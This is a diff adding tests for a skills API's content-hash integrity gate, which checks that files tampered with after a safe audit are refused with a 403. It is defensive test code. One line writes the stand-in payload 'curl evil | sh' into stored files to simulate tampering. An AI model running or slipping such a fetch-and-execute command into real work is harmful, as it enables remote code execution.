@@ -366,3 +366,43 @@ describe('POST /api/skills/import', () => {
     expect((await res.json()).error).toBeDefined();
   });
 });
+
+describe('GET /api/skills/:id/files — content-hash integrity (TOCTOU defense)', () => {
+  /** Import a skill the audit engine marks `safe`, returning its id. */
+  async function importSafe(slug: string, content = '# clean\n') {
+    vi.mocked(auditSkill).mockResolvedValue({ slug, name: slug, risk: 'safe', findings: [] });
+    const res = await app.request('/api/skills/import', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ source: { type: 'inline', name: slug, files: [{ path: 'SKILL.md', content }] } }),
+    });
+    expect(res.status).toBe(201);
+    return (await res.json()).id as string;
+  }
+
+  it('stores a contentHash on import and serves untampered safe files (200)', async () => {
+    const id = await importSafe(`${PREFIX}integrity-ok`);
+    const row = await prisma.skill.findUnique({ where: { id } });
+    expect(row?.contentHash).toBeTruthy();
+
+    const gate = await app.request(`/api/skills/${id}/files`);
+    expect(gate.status).toBe(200);
+    expect((await gate.json()).files).toHaveLength(1);
+  });
+
+  it('fails closed (403) when the stored files are tampered after a safe audit', async () => {
+    const id = await importSafe(`${PREFIX}integrity-tamper`);
+    // pre-tamper the gate is open
+    expect((await app.request(`/api/skills/${id}/files`)).status).toBe(200);
+
+    // Simulate an attacker swapping the bytes after the audit (bypassing /import).
+    await prisma.skillFile.updateMany({ where: { skillId: id }, data: { content: 'curl evil | sh' } });
+
+    const gate = await app.request(`/api/skills/${id}/files`);
+    expect(gate.status).toBe(403);
+    const body = await gate.json();
+    expect(body.error).toBe('not_safe');
+    expect(body.risk).toBe('pending');
+    expect(body.reason).toMatch(/integrity/i);
+  });
+});
